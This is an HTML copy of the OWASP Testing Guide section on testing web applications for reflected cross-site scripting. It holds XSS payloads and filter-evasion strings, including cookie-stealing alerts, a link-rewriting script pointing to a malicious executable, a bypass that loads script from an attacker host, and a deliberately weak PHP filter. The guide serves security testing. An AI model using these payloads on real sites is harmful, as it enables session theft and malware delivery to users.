<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4.8.1 Testing for Reflected Cross Site Scripting (OTG-INPVAL-001)  </title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">4.8.1 Testing for Reflected Cross Site Scripting (OTG-INPVAL-001)  </h1><br/><br /><h2>Summary</h2><br />Reflected <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">Cross-site Scripting (XSS)</a>  occur when an attacker injects browser executable code within a single  HTTP response. The injected attack is not stored within the application  itself; it is non-persistent and only impacts users who open a  maliciously crafted link or third-party web page. The attack string is  included as part of the crafted URI or HTTP parameters, improperly  processed by the application, and returned to the victim. <br /><br /> Reflected XSS are the most frequent type of XSS attacks found in the  wild. Reflected XSS attacks are also known as non-persistent XSS attacks  and, since the attack payload is delivered and executed via a single  request and response, they are also referred to as first-order or type 1  XSS. <br /><br /> When a web application is vulnerable to this type of attack, it will  pass unvalidated input sent through requests back to the client. The  common modus operandi of the attack includes a design step, in which the  attacker creates and tests an offending URI, a social engineering step,  in which she convinces her victims to load this URI on their browsers,  and the eventual  execution of the offending code using the victim's browser.  <br /><br /> Commonly the attacker's code is written in the Javascript language, but  other scripting languages are also used, e.g., ActionScript and  VBScript. Attackers typically leverage these vulnerabilities to install  key loggers, steal victim cookies, perform clipboard theft, and change  the content of the page (e.g., download links).  <br /><br /> One of the primary difficulties in preventing XSS vulnerabilities is  proper character encoding. In some cases, the web server or the web  application could not be filtering some encodings of characters, so, for  example, the web application might filter out "&lt;script&gt;", but  might not filter %3cscript%3e which simply includes another encoding of  tags. <br /><br /><h2>How to Test</h2><br /><br /><h3>Black Box testing</h3><br />A black-box test will include at least three phases: <br />1. Detect input vectors. For each web page, the tester must  determine all the web application's user-defined variables and how to  input them. This includes hidden or non-obvious inputs such as HTTP  parameters, POST data, hidden form field values, and predefined radio or  selection values. Typically in-browser HTML editors or web proxies are  used to view these hidden variables. See the example below. <br /><br /> 2. Analyze each input vector to detect potential vulnerabilities. To  detect an XSS vulnerability, the tester will typically use specially  crafted input data with each input vector. Such input data is typically  harmless, but trigger responses from the web browser that manifests the  vulnerability. Testing data can be generated by using a web application  fuzzer, an automated predefined list of known attack strings, or  manually. <br />Some example of such input data are the following: <br />&lt;script&gt;alert(123)&lt;/script&gt;<br />â€œ&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br />For a comprehensive list of potential test strings, see the <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet</a>. <br /><br /> 3. For each test input attempted in the previous phase, the tester will  analyze the result and determine if it represents a vulnerability that  has a realistic impact on the web application's security. This requires  examining the resulting web page HTML and searching for the test input.  Once found, the tester identifies any special characters that were not  properly encoded, replaced, or filtered out. The set of vulnerable  unfiltered special characters will depend on the context of that section  of HTML.  <br /><br /> Ideally all HTML special characters will be replaced with HTML entities. The key HTML entities to identify are:  <br />&gt; (greater than) <br />&lt; (less than) <br />&amp; (ampersand)<br />' (apostrophe or single quote)<br />" (double quote)<br /><br /> However, a full list of entities is defined by the HTML and XML specifications. Wikipedia has a complete reference <a href="http://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references">[1]</a>. <br /><br /> Within the context of an HTML action or JavaScript code, a different set  of special characters will need to be escaped, encoded, replaced, or  filtered out. These characters include:  <br />\n (new line)<br />\r (carriage return)<br />\' (apostrophe or single quote)<br />\" (double quote)<br />\\ (backslash)<br />\uXXXX (unicode values)<br /><br /> For a more complete reference, see the Mozilla JavaScript guide. <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Values,_variables,_and_literals#Using_special_characters_in_strings">[2]</a> <br /><br /> <br /><br /><h3>Example 1</h3><br />For example, consider a site that has a welcome notice " Welcome %username% " and a download link.  <br /><br /> <img src="images/25-1.png" alt="images/25-1.png" /> <br /><br /> The tester must suspect that every data entry point can result in an XSS  attack. To analyze it, the tester will play with the user variable and  try to trigger the vulnerability.  <br /><br /> Let's try to click on the following link and see what happens: <br />http://example.com/index.php?user=&lt;script&gt;alert(123)&lt;/script&gt;<br /> If no sanitization is applied this will result in the following popup: <br /><br /> <img src="images/25-2.png" alt="images/25-2.png" /> <br /><br /> This indicates that there is an XSS vulnerability and it appears that  the tester can execute code of his choice in anybody's browser if he  clicks on the tester's link. <br /><br /> <br /><br /><h3>Example 2</h3><br />Let's try other piece of code (link): <br />http://example.com/index.php?user=&lt;script&gt;window.onload = function() {var AllLinks=document.getElementsByTagName("a"); <br />AllLinks[0].href = "http://badexample.com/malicious.exe"; }&lt;/script&gt; <br /> This produces the following behavior: <br /><br /> <img src="images/25-3.png" alt="images/25-3.png" /> <br /><br /> This will cause the user, clicking on the link supplied by the tester,  to download the file malicious.exe from a site he controls. <br /><br /> <br /><br /><h3>Bypass XSS filters</h3><br />Reflected cross-site scripting attacks are prevented as the web  application sanitizes input, a web application firewall blocks malicious  input, or by mechanisms embedded in modern web browsers. The tester  must test for vulnerabilities assuming that web browsers will not  prevent the attack. Browsers may be out of date, or have built-in  security features disabled. Similarly, web application firewalls are not  guaranteed to recognize novel, unknown attacks. An attacker could craft  an attack string that is unrecognized by the web application firewall. <br /><br /> Thus, the majority of XSS prevention must depend on the web  application's sanitization of untrusted user input. There are several  mechanisms available to developers for sanitization, such as returning  an error, removing, encoding, or replacing invalid input. The means by  which the application detects and corrects invalid input is another  primary weakness in preventing XSS. A blacklist may not include all  possible attack strings, a whitelist may be overly permissive, the  sanitization could fail, or a type of input may be incorrectly trusted  and remain unsanitized. All of these allow attackers to circumvent XSS  filters. <br /><br /> The <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet</a> documents common filter evasion tests. <br /><br /> <br /><br /><h3>Example 3: Tag Attribute Value</h3><br /><br /> Since these filters are based on a blacklist, they could not block every  type of expressions. In fact, there are cases in which an XSS exploit  can be carried out without the use of &lt;script&gt; tags and even  without the use of characters such as " &lt; &gt; and / that are  commonly filtered. <br /><br /> For example, the web application could use the user input value to fill an attribute, as shown in the following code: <br />&lt;input type="text" name="state" value="INPUT_FROM_USER"&gt;<br /><br /> Then an attacker could submit the following code: <br />" onfocus="alert(document.cookie)<br /><br /> <br /><br /><h3>Example 4: Different syntax or encoding</h3><br /><br /> In some cases it is possible that signature-based filters can be simply  defeated by obfuscating the attack. Typically you can do this through  the insertion of unexpected variations in the syntax or in the  enconding. These variations are tolerated by browsers as valid HTML when  the code is returned, and yet they could also be accepted by the  filter.  <br /><br /> Following some examples: <br />"&gt;&lt;script &gt;alert(document.cookie)&lt;/script &gt;<br />"&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;<br />"%3cscript%3ealert(document.cookie)%3c/script%3e<br /><br /> <br /><br /><h3>Example 5: Bypassing non-recursive filtering</h3><br /><br /> Sometimes the sanitization is applied only once and it is not being  performed recursively. In this case the attacker can beat the filter by  sending a string containing multiple attempts, like this one: <br />&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;<br /><br /> <br /><br /><h3>Example 6: Including external script</h3><br /><br /> Now suppose that developers of the target site implemented the following  code to protect the input from the inclusion of external script:  <br />&lt;?<br />   $re = "/&lt;script[^&gt;]+src/i";<br /><br />   if (preg_match($re, $_GET['var'])) <br />   {<br />      echo "Filtered";<br />      return; <br />   }<br />   echo "Welcome ".$_GET['var']."Â !";<br />?&gt;<br /><br /> In this scenario there is a regular expression checking if <strong>&lt;script [anything but the character: '&gt;' ] src</strong> is inserted. This is useful for filtering expressions like  <br />&lt;script src="http://attacker/xss.js"&gt;&lt;/script&gt;<br />which is a common attack. But, in this case, it is possible to bypass  the sanitization by using the "&gt;" character in an attribute between  script and src, like this:  <br />http://example/?var=&lt;SCRIPT%20a="&gt;"%20SRC="http://attacker/xss.js"&gt;&lt;/SCRIPT&gt; <br /><br /> This will exploit the reflected cross site scripting vulnerability shown  before, executing the javascript code stored on the attacker's web  server as if it was originating from the victim web site, <a href="http://example/">http://example/</a>.  <br /><br /> <br /><br /><h3>Example 7: HTTP Parameter Pollution (HPP)</h3><br /><br /> Another method to bypass filters is the HTTP Parameter Pollution, this  technique was first presented by Stefano di Paola and Luca Carettoni in  2009 at the OWASP Poland conference. See the <a href="https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)">Testing for HTTP Parameter pollution</a>  for more information. This evasion technique consists of splitting an  attack vector between multiple parameters that have the same name. The  manipulation of the value of each parameter depends on how each web  technology is parsing these parameters, so this type of evasion is not  always possible. If the tested environment concatenates the values of  all parameters with the same name, then an attacker could use this  technique in order to bypass pattern- based security mechanisms. <br /> <br />Regular attack:  <br />http://example/page.php?param=&lt;script&gt;[...]&lt;/script&gt;<br />Attack using HPP: <br />http://example/page.php?param=&lt;script&amp;param=&gt;[...]&lt;/&amp;param=script&gt;<br /><br /> <strong> Result expected </strong> <br /> See the <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet</a>  for a more detailed list of filter evasion techniques. Finally,  analyzing answers can get complex. A simple way to do this is to use  code that pops up a dialog, as in our example. This typically indicates  that an attacker could execute arbitrary JavaScript of his choice in the  visitors' browsers.  <br /><br /> <br /><br /><h3>Gray Box testing</h3><br />Gray Box testing is similar to Black box testing. In gray box  testing, the pen-tester has partial knowledge of the application. In  this case, information regarding user input, input validation controls,  and how the user input is rendered back to the user might be known by  the pen-tester.  <br /><br /> If source code is available (White Box), all variables received from  users should be analyzed. Moreover the tester should analyze any  sanitization procedures implemented to decide if these can be  circumvented.  <br /><br /><h2>Tools</h2><br />â€¢  <a href="https://www.owasp.org/index.php/OWASP_CAL9000_Project">OWASP CAL9000</a> <br />CAL9000 is a collection of web application security testing tools  that complement the feature set of current web proxies and automated  scanners. It's hosted as a reference at <a href="https://1337.yehg.net/CAL9000/">https://1337.yehg.net/CAL9000/</a> . <br />â€¢  <strong>PHP Charset Encoder(PCE)</strong> - <a href="http://h4k.in/encoding">http://h4k.in/encoding</a> [mirror: <a href="http://yehg.net/e">http://yehg.net/e</a> ]<br />This tool helps you encode arbitrary texts to and from 65 kinds of  charsets. Also some encoding functions featured by JavaScript are  provided. <br />â€¢  <strong>HackVertor</strong> -  <a href="http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php">http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php</a><br />It provides multiple dozens of flexible encoding for advanced string manipulation attacks. <br />â€¢  <a href="https://www.owasp.org/index.php/OWASP_WebScarab_Project">WebScarab</a><br />WebScarab is a framework for analysing applications that communicate using the HTTP and HTTPS protocols.  <br />â€¢  <strong>XSS-Proxy</strong> - <a href="http://xss-proxy.sourceforge.net/">http://xss-proxy.sourceforge.net/</a><br />XSS-Proxy is an advanced Cross-Site-Scripting (XSS) attack tool. <br />â€¢  <strong>ratproxy</strong> - <a href="http://code.google.com/p/ratproxy/">http://code.google.com/p/ratproxy/</a><br />A semi-automated, largely passive web application security audit  tool, optimized for an accurate and sensitive detection, and automatic  annotation, of potential problems and security-relevant design patterns  based on the observation of existing, user-initiated traffic in complex  web 2.0 environments. <br />â€¢  <strong>Burp Proxy</strong> - <a href="http://portswigger.net/proxy/">http://portswigger.net/proxy/</a><br />Burp Proxy is an interactive HTTP/S proxy server for attacking and testing web applications. <br />â€¢  <strong>OWASP Zed Attack Proxy (ZAP)</strong> - <a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">OWASP_Zed_Attack_Proxy_Project</a><br />ZAP is an easy to use integrated penetration testing tool for finding  vulnerabilities in web applications. It is designed to be used by  people with a wide range of security experience and as such is ideal for  developers and functional testers who are new to penetration testing.  ZAP provides automated scanners as well as a set of tools that allow you  to find security vulnerabilities manually. <br />â€¢  <strong>OWASP Xenotix XSS Exploit Framework</strong> - <a href="https://www.owasp.org/index.php/OWASP_Xenotix_XSS_Exploit_Framework">OWASP_Xenotix_XSS_Exploit_Framework</a><br />OWASP Xenotix XSS Exploit Framework is an advanced Cross Site  Scripting (XSS) vulnerability detection and exploitation framework. It  provides Zero False Positive scan results with its unique Triple Browser  Engine (Trident, WebKit, and Gecko) embedded scanner. It is claimed to  have the worldâ€™s 2nd largest XSS Payloads of about 1600+ distinctive XSS  Payloads for effective XSS vulnerability detection and WAF Bypass.  Xenotix Scripting Engine allows you to create custom test cases and  addons over the Xenotix API. It is incorporated with a feature rich  Information Gathering module for target Reconnaissance. The Exploit  Framework includes offensive XSS exploitation modules for Penetration  Testing and Proof of Concept creation. <br /><br /> <br /><br /><h2>References</h2><br /><strong>OWASP Resources</strong><br /> <br />â€¢ <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet</a> <br /><strong>Books</strong><br /> <br />â€¢  Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications", Second Edition, McGraw-Hill, 2006 - <a href="https://www.owasp.org/index.php/Special:BookSources/0072262290">ISBN 0-07-226229-0</a><br />â€¢  Dafydd Stuttard, Marcus Pinto - "The Web Application's Handbook - Discovering and Exploiting Security Flaws", 2008, Wiley, <a href="https://www.owasp.org/index.php/Special:BookSources/9780470170779">ISBN 978-0-470-17077-9</a><br />â€¢  Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "Cross Site Scripting Attacks: XSS Exploits and Defense", 2007, Syngress, ISBN-10: 1-59749-154-3<br /><strong>Whitepapers</strong><br /> <br />â€¢  <strong>CERT</strong> - Malicious HTML Tags Embedded in Client Web Requests: <a href="http://www.cert.org/advisories/CA-2000-02.html">Read</a><br />â€¢  <strong>Rsnake</strong> - XSS Cheat Sheet: <a href="http://ha.ckers.org/xss.html">Read</a><br />â€¢  <strong>cgisecurity.com</strong> - The Cross Site Scripting FAQ: <a href="http://www.cgisecurity.com/articles/xss-faq.shtml">Read</a><br />â€¢  <strong>G.Ollmann</strong> - HTML Code Injection and Cross-site scripting: <a href="http://www.technicalinfo.net/papers/CSS.html">Read</a><br />â€¢  <strong>A. Calvo, D.Tiscornia</strong> - alert('A javascritp agent'): <a href="http://www.coresecurity.com/corelabs-research/publications/alert-a-javascript-agent">Read</a> <br />â€¢  <strong>S. Frei, T. DÃ¼bendorfer, G. Ollmann, M. May</strong> - Understanding the Web browser threat: <a href="http://www.techzoom.net/publications/insecurity-iceberg/index.en">Read</a><br /></div></body></html>